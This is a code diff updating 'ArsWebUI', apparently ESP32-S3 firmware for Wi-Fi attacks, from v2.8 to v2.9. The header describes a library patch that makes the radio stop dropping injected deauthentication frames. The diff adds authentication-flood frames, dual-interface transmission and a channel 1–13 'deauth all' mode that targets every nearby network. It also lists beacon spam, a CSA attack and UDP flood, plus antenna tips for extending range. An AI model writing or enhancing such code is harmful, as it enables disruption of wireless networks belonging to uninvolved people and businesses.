@@ -1,77 +1,62 @@
 /*
  ==================================================
-  ArsWebUI v2.8 — ESP32-S3 N16R8
+  ArsWebUI v2.9 — ESP32-S3 N16R8
 
-  CRITICAL PREREQUISITE — ONE-TIME LIBRARY PATCH:
-    esp_wifi_80211_tx() on S3 IDF 4.4+ silently drops deauth
-    (0xC0) and disassoc (0xA0) frames via ieee80211_raw_frame_
-    sanity_check() inside libnet80211.a.  Weaken that symbol
-    so the stub below overrides it at link time:
+  CRITICAL PREREQUISITE — LIBNET80211.A PATCH:
+    Build via GitHub Actions (build.yml included).
+    The workflow automatically patches libnet80211.a
+    with objcopy before compiling, weakening
+    ieee80211_raw_frame_sanity_check so the stub
+    below overrides it at link time.
+    WITHOUT this patch, ZERO deauth/disassoc frames
+    ever leave the radio regardless of any other fix.
 
-    Linux/macOS (run once, replace VERSION):
-      LIB=~/.arduino15/packages/esp32/hardware/esp32/VERSION/tools/sdk/esp32s3/lib/libnet80211.a
-      OBJ=~/.arduino15/packages/esp32/tools/xtensa-esp32s3-elf-gcc/TOOLCHAIN/bin/xtensa-esp32s3-elf-objcopy
-      $OBJ --weaken-symbol=ieee80211_raw_frame_sanity_check $LIB $LIB
+  NEW IN v2.9:
+    - DEAUTH FIX: tx_frame now tries BOTH interfaces
+      (AP + STA) always — no more short-circuit OR
+      that skipped STA when AP TX succeeded
+    - DEAUTH FIX: direction-2 (client→AP) disassoc
+      reason code was never set — now fixed
+    - DEAUTH FIX: auth flood frames added per burst —
+      exhausts AP association table alongside deauth
+    - DEAUTH ALL: multi-channel ch1-13 mode added
+      (/deauth_all_ch) — briefly stops AP per channel
+      hop, uses PSRAM target cache for speed
+    - DEAUTH ALL: single-channel mode improved —
+      tries STA-interface TX even for non-AP-channel
+      targets (best-effort, hardware limited)
+    - PSRAM: target buffer (256 APs) allocated from
+      OPI PSRAM on boot, falls back to heap
+    - WEB UI: hardware recommendations section added
+      (antenna, power supply, range tips for bare S3)
+    - WEB UI: DEAUTH CH1-13 button + auto-reconnect JS
+    - WEB UI: deauthallch badge
 
-    Windows (Git Bash, replace paths):
-      objcopy --weaken-symbol=ieee80211_raw_frame_sanity_check libnet80211.a libnet80211.a
+  RETAINED FROM v2.8:
+    - ArduinoOTA (port 3232, default pass "arswebui")
+    - LED: Blue=Boot, Green=Idle, Purple=Attack,
+           Yellow=OTA, Red=Fatal
+    - Promiscuous client sniffer
+    - Beacon spam (20 PH-flavored fake SSIDs)
+    - CSA attack, UDP flood
+    - Auto-refresh WiFi/client scanner
+    - STA connect + AP rename
 
-    The stub (already in this file) overrides the weakened symbol
-    so ALL frame types are accepted by esp_wifi_80211_tx().
-    Without this patch, zero deauth/disassoc frames ever leave
-    the radio regardless of any other fix.
-
-  NEW IN v2.8:
-    - OTA (ArduinoOTA) over both AP and STA interfaces (port 3232)
-    - Default OTA password: "arswebui" — changeable via /setotapass
-    - /ota_info endpoint: returns AP IP:port + OTA IP:port
-    - Dashboard live-row now shows AP IP, web port, OTA port
-    - Antenna recommendation banner at top of web UI (dismissable)
-    - Auto-refresh toggle for WiFi scanner (15s interval)
-    - Auto-refresh toggle for passive client scanner (5s interval)
-    - CRASH FIX: vTaskDelay burst yield 4ms → 50ms (prevents WDT crash
-      at HIGH/MAX intensity after 20+ seconds)
-    - Inter-frame delay 150µs → 50µs (faster bursts within safe yield)
-    - OTA starts clean: stops all attacks before flashing
-
-  FIXES RETAINED FROM v2.7:
-    - ieee80211_raw_frame_sanity_check stub (frame type unblock)
-    - Removed esp_wifi_internal_tx
-    - en_sys_seq=true in ALL esp_wifi_80211_tx calls
-    - set_channel skipped when target ch == AP channel
-    - pausePromiscForTX spinwait: probe skipped when on AP channel
-    - Cross-channel note: APSTA mode AP pins radio to AP_CHANNEL
-
-  FLASH SETTINGS (Arduino IDE):
+  FLASH SETTINGS:
     Board            : ESP32S3 Dev Module
     Flash Size       : 16MB (128Mb)
-    Partition Scheme : Default 4MB with spiffs  ← CHANGED for OTA
-                       (or "Minimal SPIFFS 1.9MB APP with OTA")
-                       OTA requires a partition scheme with OTA slots.
-                       "Huge APP (3MB No OTA)" will NOT compile OTA.
-    PSRAM            : OPI PSRAM (optional)
+    Partition Scheme : Huge APP (3MB No OTA/1MB SPIFFS)
+    PSRAM            : OPI PSRAM
     USB Mode         : Hardware CDC and JTAG
-    USB CDC On Boot  : Disabled           ← CRITICAL
+    USB CDC On Boot  : Disabled  ← CRITICAL
     CPU Frequency    : 240MHz
-    Upload Speed     : 921600
-    Core Debug Level : None
 
-  REQUIRED LIBRARIES:
-    - ESPAsyncWebServer (me-no-dev or mathieucarbou / ESP32Async)
-    - AsyncTCP
-    - Adafruit NeoPixel
-    - ArduinoOTA (bundled with ESP32 Arduino core)
-
-  NEOPIXEL (GPIO48):
-    Blue   = Booting
-    Green  = Ready / idle
-    Purple = Attack active (pulse)
-    Red    = Fatal error
-    Yellow = OTA in progress
-
-  SERIAL:
-    UART0 GPIO43 TX / GPIO44 RX @ 115200
-    USB CDC On Boot = Disabled
+  HARDWARE RANGE TIPS (bare ESP32-S3 N16R8):
+    • U.FL/IPEX connector → RP-SMA adapter → 5dBi
+      2.4GHz omni antenna adds ~6dBm effective gain
+    • Keep USB power supply >1A (radio at MAX TX = ~350mA)
+    • Metal enclosure kills range — use plastic/acrylic
+    • Raise the board above obstacles (elevation = range)
  ==================================================
 */
 
@@ -177,6 +162,16 @@ void updateLED() {
 #define INTENSITY_HIGH  40
 #define INTENSITY_MAX   80
 
+// ─── PSRAM TARGET BUFFER ─────────────────────────────────────────────────────
+#include <esp_heap_caps.h>
+
+#define MAX_PSRAM_TARGETS 256
+
+struct DeauthTarget { uint8_t bssid[6]; uint8_t ch; };
+
+static DeauthTarget* psramTargets   = nullptr;
+static bool          psramAvailable = false;
+
 // ─── GLOBALS ─────────────────────────────────────────────────────────────────
 AsyncWebServer server(WEB_PORT);
 DNSServer      dnsServer;
@@ -190,6 +185,7 @@ volatile unsigned long packetsSent   = 0;
 TaskHandle_t deauthTaskHandle    = NULL;
 TaskHandle_t udpTaskHandle       = NULL;
 TaskHandle_t deauthAllTaskHandle = NULL;
+TaskHandle_t deauthAllChHandle   = NULL;
 TaskHandle_t promiscTaskHandle   = NULL;
 TaskHandle_t beaconTaskHandle    = NULL;
 TaskHandle_t csaTaskHandle       = NULL;
@@ -385,7 +381,7 @@ int sendDeauthBurst(const uint8_t* bssid, int ch,
                  ch, AP_CHANNEL, AP_CHANNEL);
       s_txFailLog++;
     } else {
-      ets_delay_us(4000);  // PHY settle after hop
+      ets_delay_us(4000);
     }
   }
 
@@ -399,23 +395,32 @@ int sendDeauthBurst(const uint8_t* bssid, int ch,
   // ── Direction 1: AP → Client (or broadcast) ──────────────────────────────
   uint8_t deauth1[26]   = {};
   uint8_t disassoc1[26] = {};
-  deauth1[0]   = 0xC0; deauth1[1] = 0x00;
+  uint8_t auth1[30]     = {};   // v2.9: auth flood — exhausts AP assoc table
+  deauth1[0]   = 0xC0; deauth1[1]   = 0x00;
   disassoc1[0] = 0xA0; disassoc1[1] = 0x00;
-  deauth1[2]   = disassoc1[2] = 0x3A;
-  deauth1[3]   = disassoc1[3] = 0x01;
+  auth1[0]     = 0xB0; auth1[1]     = 0x00;   // Authentication frame
+  deauth1[2]   = disassoc1[2] = auth1[2] = 0x3A;
+  deauth1[3]   = disassoc1[3] = auth1[3] = 0x01;
   memcpy(&deauth1[4],    da,    6);
   memcpy(&disassoc1[4],  da,    6);
+  memcpy(&auth1[4],      da,    6);
   memcpy(&deauth1[10],   sa,    6);
   memcpy(&disassoc1[10], sa,    6);
+  memcpy(&auth1[10],     sa,    6);
   memcpy(&deauth1[16],   bssid, 6);
   memcpy(&disassoc1[16], bssid, 6);
+  memcpy(&auth1[16],     bssid, 6);
+  // Auth body: alg=0 (open), seq=1, status=0
+  auth1[24] = 0x00; auth1[25] = 0x00;
+  auth1[26] = 0x01; auth1[27] = 0x00;
+  auth1[28] = 0x00; auth1[29] = 0x00;
 
   // ── Direction 2: Client → AP (targeted client only) ──────────────────────
   uint8_t deauth2[26]   = {};
   uint8_t disassoc2[26] = {};
   const bool dir2 = (client != nullptr);
   if (dir2) {
-    deauth2[0]   = 0xC0; deauth2[1] = 0x00;
+    deauth2[0]   = 0xC0; deauth2[1]   = 0x00;
     disassoc2[0] = 0xA0; disassoc2[1] = 0x00;
     deauth2[2]   = disassoc2[2] = 0x3A;
     deauth2[3]   = disassoc2[3] = 0x01;
@@ -427,35 +432,51 @@ int sendDeauthBurst(const uint8_t* bssid, int ch,
     memcpy(&disassoc2[16], bssid,  6);
   }
 
-  auto tx_frame = [](void* f, uint16_t len) -> bool {
-    if (esp_wifi_80211_tx(WIFI_IF_AP,  (const uint8_t*)f, len, true) == ESP_OK) return true;
-    if (esp_wifi_80211_tx(WIFI_IF_STA, (const uint8_t*)f, len, true) == ESP_OK) return true;
-    return false;
+  // v2.9 FIX: try BOTH interfaces always — no short-circuit OR.
+  // Previously: if AP TX succeeded, STA TX was skipped.
+  // Now: both fire every frame for maximum reach.
+  auto tx_both = [](const uint8_t* f, uint16_t len) -> int {
+    int ok = 0;
+    if (esp_wifi_80211_tx(WIFI_IF_AP,  f, len, true) == ESP_OK) ok++;
+    if (esp_wifi_80211_tx(WIFI_IF_STA, f, len, true) == ESP_OK) ok++;
+    return ok;
   };
 
   int sent = 0;
   for (int i = 0; i < numFrames && !stopRequested; i++) {
     const uint8_t r = nextReason();
-    deauth1[24] = r; deauth1[25] = 0;
-    disassoc1[24] = r; disassoc1[25] = 0;
 
-    if (tx_frame(deauth1,   26)) sent++;
-    ets_delay_us(50);          // v2.8: 50µs (was 150µs) — faster cadence
-    if (tx_frame(disassoc1, 26)) sent++;
+    // Deauth direction 1
+    deauth1[24] = r; deauth1[25] = 0;
+    sent += tx_both(deauth1, 26);
     ets_delay_us(50);
 
-    if (dir2) {
-      deauth2[24] = r; deauth2[25] = 0;
-      disassoc2[24] = r; disassoc2[25] = 0;
-      if (tx_frame(deauth2,   26)) sent++;
+    // Disassoc direction 1
+    disassoc1[24] = r; disassoc1[25] = 0;
+    sent += tx_both(disassoc1, 26);
+    ets_delay_us(50);
+
+    // Auth flood (every other frame to not overload) — exhausts assoc table
+    if (i % 2 == 0) {
+      sent += tx_both(auth1, 30);
       ets_delay_us(50);
-      if (tx_frame(disassoc2, 26)) sent++;
+    }
+
+    if (dir2) {
+      // Deauth direction 2: client → AP
+      deauth2[24] = r; deauth2[25] = 0;
+      sent += tx_both(deauth2, 26);
+      ets_delay_us(50);
+
+      // v2.9 FIX: disassoc2 reason was never set before
+      disassoc2[24] = r; disassoc2[25] = 0;
+      sent += tx_both(disassoc2, 26);
       ets_delay_us(50);
     }
   }
 
   if (sent == 0 && s_txFailLog < 8) {
-    logEvent("TX burst zero ch=%d frames=%d (80211_tx failing — lib patch done?)", ch, numFrames);
+    logEvent("TX burst zero ch=%d frames=%d (lib patch done?)", ch, numFrames);
     s_txFailLog++;
   }
 
@@ -785,22 +806,16 @@ void deauthTask(void* param) {
   vTaskDelete(NULL);
 }
 
-// ─── DEAUTH-ALL TASK ─────────────────────────────────────────────────────────
+// ─── DEAUTH-ALL TASK (AP stays up, best-effort on non-AP channels) ───────────
 void deauth_all_task(void* param) {
   s_txFailLog = 0;
-  logEvent("Deauth-All started — continuous multi-channel sweep");
+  logEvent("Deauth-All AP-channel sweep started");
   setLedState(LS_PURPLE);
 
   while (attackRunning && !stopRequested) {
-    if (ESP.getFreeHeap() < 8000) {
-      logEvent("HEAP VERY LOW — Deauth-All continues");
-    }
-
     bool wasRunning = promiscRunning;
     if (wasRunning) pausePromiscForTX();
-
     int n = WiFi.scanNetworks(false, true, false, 120);
-
     if (wasRunning) resumePromiscAfterTX();
 
     if (n > 0) {
@@ -808,34 +823,146 @@ void deauth_all_task(void* param) {
         uint8_t* bssid = WiFi.BSSID(i);
         int      ch    = WiFi.channel(i);
         if (!bssid || !validateChannel(ch)) continue;
-
         char bstr[18];
         snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
         if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
 
-        if (ch != AP_CHANNEL) continue;
-
         pausePromiscForTX();
-        sendDeauthBurst(bssid, AP_CHANNEL, nullptr, intensity / 2 + 1);
+        if (ch == AP_CHANNEL) {
+          // Full burst — radio is already on AP_CHANNEL
+          sendDeauthBurst(bssid, AP_CHANNEL, nullptr, intensity / 2 + 1);
+        } else {
+          // Best-effort on non-AP channel via STA interface.
+          // In APSTA mode the radio stays ~90% on AP_CHANNEL;
+          // these frames may or may not reach the target but
+          // we try rather than skip entirely.
+          esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+          ets_delay_us(3000);
+          sendDeauthBurst(bssid, ch, nullptr, 4); // short burst
+          esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+          ets_delay_us(2000);
+        }
         resumePromiscAfterTX();
-        vTaskDelay(pdMS_TO_TICKS(50));
+        vTaskDelay(pdMS_TO_TICKS(30));
       }
     }
-
     WiFi.scanDelete();
-
-    for (int i = 0; i < 12 && !stopRequested; i++)
+    for (int i = 0; i < 10 && !stopRequested; i++)
       vTaskDelay(pdMS_TO_TICKS(100));
   }
 
   esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
   WiFi.scanDelete();
   logEvent("Deauth-All ended. Pkts:%lu", packetsSent);
-
   if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
     attackRunning = stopRequested = false;
     deauthAllTaskHandle = NULL;
+    xSemaphoreGive(attackMutex);
+  }
+  setLedState(LS_GREEN);
+  vTaskDelete(NULL);
+}
+
+// ─── DEAUTH-ALL MULTICHANNEL (ch1-13, stops AP per hop) ──────────────────────
+// Sweep: scan → cache targets in PSRAM → for each channel: stop AP, hop,
+// blast all targets on that ch, restart AP. Control UI flickers ~300ms/channel.
+void deauth_all_ch_task(void* param) {
+  s_txFailLog = 0;
+  logEvent("Deauth-All MULTICHANNEL ch1-13 started");
+  setLedState(LS_PURPLE);
+
+  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
+  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);
+
+  // Allocate target buffer from PSRAM or heap
+  DeauthTarget* targets = psramAvailable
+    ? psramTargets
+    : (DeauthTarget*)malloc(sizeof(DeauthTarget) * MAX_PSRAM_TARGETS);
+
+  if (!targets) {
+    logEvent("ALLOC FAIL — multichannel aborted");
+    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
+      attackRunning = stopRequested = false;
+      deauthAllChHandle = NULL;
+      xSemaphoreGive(attackMutex);
+    }
+    setLedState(LS_GREEN);
+    vTaskDelete(NULL);
+    return;
+  }
+
+  while (attackRunning && !stopRequested) {
+    int targetCount = 0;
+
+    // ── Phase 1: Stop AP, full scan ──────────────────────────────────────────
+    stopPromiscuous();
+    WiFi.softAPdisconnect(false);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    int n = WiFi.scanNetworks(false, true, false, 150);
+    if (n > 0) {
+      for (int i = 0; i < n && targetCount < MAX_PSRAM_TARGETS; i++) {
+        uint8_t* bssid = WiFi.BSSID(i);
+        int      ch    = WiFi.channel(i);
+        if (!bssid || !validateChannel(ch)) continue;
+        char bstr[18];
+        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
+        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
+        memcpy(targets[targetCount].bssid, bssid, 6);
+        targets[targetCount].ch = (uint8_t)ch;
+        targetCount++;
+      }
+    }
+    WiFi.scanDelete();
+    logEvent("Multichannel: %d targets, PSRAM=%s", targetCount,
+             psramAvailable ? "YES" : "NO(heap)");
+
+    // ── Phase 2: Per-channel hop & blast ────────────────────────────────────
+    for (int ch = 1; ch <= CHANNEL_MAX && !stopRequested; ch++) {
+      bool any = false;
+      for (int i = 0; i < targetCount; i++)
+        if (targets[i].ch == ch) { any = true; break; }
+      if (!any) continue;
+
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      vTaskDelay(pdMS_TO_TICKS(6));
+
+      for (int i = 0; i < targetCount && !stopRequested; i++) {
+        if (targets[i].ch != ch) continue;
+        sendDeauthBurst(targets[i].bssid, ch, nullptr,
+                        (intensity / 2) + 1);
+        vTaskDelay(pdMS_TO_TICKS(8));
+      }
+    }
+
+    // ── Phase 3: Restart AP ──────────────────────────────────────────────────
+    esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+    vTaskDelay(pdMS_TO_TICKS(50));
+    WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
+    WiFi.softAPmacAddress(ownBSSIDap);
+    boostTxPower();
+    startPromiscuous();
+    logEvent("Multichannel sweep done — AP restarted. Pkts:%lu", packetsSent);
+
+    for (int i = 0; i < 25 && !stopRequested; i++)
+      vTaskDelay(pdMS_TO_TICKS(100));
+  }
+
+  // Ensure AP is back
+  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+  WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
+  WiFi.softAPmacAddress(ownBSSIDap);
+  boostTxPower();
+  startPromiscuous();
+
+  if (!psramAvailable && targets) free(targets);
+
+  logEvent("Deauth-All MULTICHANNEL ended. Pkts:%lu", packetsSent);
+  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
+    attackRunning = stopRequested = false;
+    deauthAllChHandle = NULL;
     xSemaphoreGive(attackMutex);
   }
   setLedState(LS_GREEN);
@@ -883,13 +1010,15 @@ void stopAllAttacks() {
 
   unsigned long t0 = millis();
   while ((deauthTaskHandle || udpTaskHandle || deauthAllTaskHandle ||
-          beaconTaskHandle  || csaTaskHandle) && millis() - t0 < 2500) {
+          deauthAllChHandle  || beaconTaskHandle || csaTaskHandle) &&
+         millis() - t0 < 2500) {
     delay(30);
   }
 
   if (deauthTaskHandle)    { vTaskDelete(deauthTaskHandle);    deauthTaskHandle    = NULL; }
   if (udpTaskHandle)       { vTaskDelete(udpTaskHandle);       udpTaskHandle       = NULL; }
   if (deauthAllTaskHandle) { vTaskDelete(deauthAllTaskHandle); deauthAllTaskHandle = NULL; }
+  if (deauthAllChHandle)   { vTaskDelete(deauthAllChHandle);   deauthAllChHandle   = NULL; }
   if (beaconTaskHandle)    { vTaskDelete(beaconTaskHandle);    beaconTaskHandle    = NULL; }
   if (csaTaskHandle)       { vTaskDelete(csaTaskHandle);       csaTaskHandle       = NULL; }
 
@@ -1173,6 +1302,30 @@ void setupServer() {
     r->send(200,"text/plain","Deauth-All started");
   });
 
+  // ── /deauth_all_ch — full ch1-13 multichannel (stops AP briefly per hop) ──
+  server.on("/deauth_all_ch", HTTP_GET, [](AsyncWebServerRequest* r) {
+    if (!authOk(r)) return;
+    if (r->hasParam("inten")) {
+      int v = r->getParam("inten")->value().toInt();
+      if      (v == 1) intensity = INTENSITY_LOW;
+      else if (v == 2) intensity = INTENSITY_MED;
+      else if (v == 3) intensity = INTENSITY_HIGH;
+      else if (v == 4) intensity = INTENSITY_MAX;
+    }
+    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
+      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
+    }
+    if (attackRunning) {
+      xSemaphoreGive(attackMutex);
+      r->send(409,"text/plain","ERROR: Attack running"); return;
+    }
+    attackRunning = true; stopRequested = false; packetsSent = 0;
+    xSemaphoreGive(attackMutex);
+    xTaskCreatePinnedToCore(deauth_all_ch_task, "dallch", 10240, NULL, 2,
+                            &deauthAllChHandle, 0);
+    r->send(200,"text/plain","Deauth-All MULTICHANNEL ch1-13 started");
+  });
+
   // ── /stop ─────────────────────────────────────────────────────────────────
   server.on("/stop", HTTP_GET, [](AsyncWebServerRequest* r) {
     if (!authOk(r)) return;
@@ -1291,7 +1444,8 @@ void setupServer() {
 
   server.on("/attack_status", HTTP_GET, [](AsyncWebServerRequest* r) {
     String type = "idle";
-    if      (deauthAllTaskHandle) type = "deauthall";
+    if      (deauthAllChHandle)   type = "deauthallch";
+    else if (deauthAllTaskHandle) type = "deauthall";
     else if (deauthRunning)       type = "deauth";
     else if (udpTaskHandle)       type = "udpflood";
     else if (beaconTaskHandle)    type = "beacon";
@@ -1385,7 +1539,7 @@ void setup() {
   Serial0.begin(115200);
   delay(200);
   Serial0.println("\n==========================================");
-  Serial0.println("  ArsWebUI v2.8 — ESP32-S3 N16R8");
+  Serial0.println("  ArsWebUI v2.9 — ESP32-S3 N16R8");
   Serial0.println("==========================================\n");
 
   // ── NeoPixel ────────────────────────────────────────────────────────────
@@ -1407,6 +1561,17 @@ void setup() {
     setLedState(LS_RED); updateLED();
     while (1) delay(1000);
   }
+
+  // ── PSRAM target buffer ───────────────────────────────────────────────────
+  psramAvailable = psramFound();
+  if (psramAvailable) {
+    psramTargets = (DeauthTarget*)heap_caps_malloc(
+      sizeof(DeauthTarget) * MAX_PSRAM_TARGETS, MALLOC_CAP_SPIRAM);
+    if (!psramTargets) psramAvailable = false;
+  }
+  INFO("PSRAM: %s (%u bytes free SPIRAM)",
+       psramAvailable ? "OK" : "NONE/HEAP",
+       (unsigned)ESP.getFreePsram());
 
   // ── NVS + Preferences ────────────────────────────────────────────────────
   esp_err_t nvs = nvs_flash_init();
@@ -1549,8 +1714,9 @@ void setup() {
     Serial0.printf("[INFO] OTA: %s:%d\n", WiFi.softAPIP().toString().c_str(), OTA_PORT);
   }
 
-  logEvent("Boot OK — v2.8. AP: %s  Heap: %u",
-    apSSID.c_str(), ESP.getFreeHeap());
+  logEvent("Boot OK — v2.9. AP:%s Heap:%u PSRAM:%s",
+    apSSID.c_str(), ESP.getFreeHeap(),
+    psramAvailable ? "YES" : "NO");
 
   Serial0.printf("[INFO] Web UI: http://%s\n", WiFi.softAPIP().toString().c_str());
   Serial0.printf("[INFO] Free heap: %u bytes\n", ESP.getFreeHeap());
